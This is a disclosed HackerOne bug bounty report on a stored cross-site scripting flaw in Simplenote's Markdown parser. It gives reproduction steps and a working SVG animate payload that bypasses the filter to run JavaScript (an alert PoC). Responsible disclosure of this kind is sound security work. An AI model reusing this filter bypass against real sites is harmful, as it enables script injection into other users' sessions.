# [app.simplenote.com] Stored XSS via Markdown SVG filter bypass

## Report Details
- **Report ID**: 271007
- **URL**: https://hackerone.com/reports/271007
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-09-22T20:53:22.156Z
- **Disclosed**: 2017-11-12T16:19:51.168Z

## Reporter
- **Username**: ysx
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
Hi,

A carefully crafted injection used against the Markdown input parser can be leveraged to store and execute arbitrary JavaScript in the `app.simplenote.com` context.

## Proof of concept
Before proceeding to reproduce this vulnerability, please log in to `app.simplenote.com` and create a new note with the "Markdown Formatted" option enabled.

1. Please paste the below payload into the "Edit" window, then select the "triple dots" icon > **Publish**

2. Next, please access the provided Simplenote URL, and select the black rectangle to execute the XSS payload.

Please note that I deleted the note and account used to test the aforementioned PoC immediately after confirming successful exploitation.

### Markdown parser payload

```
<div id="137"><svg>
<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
<circle r="400"></circle>
<animate attributeName="xlink:href" begin="0" from="javascript:alert(document.domain)" to="&" />
</a>//["'`-->]]>]</div>
```

### Supporting evidence

{F223223}

## Verified conditions

At the time of testing, I have successfully confirmed exploitability in the following environment:

* Firefox 55.0.3 stable (32-bit) on Ubuntu 16.04.3 LTS

Thanks,

Yasin


## Attachments
- Simplenote_Stored_XSS.png
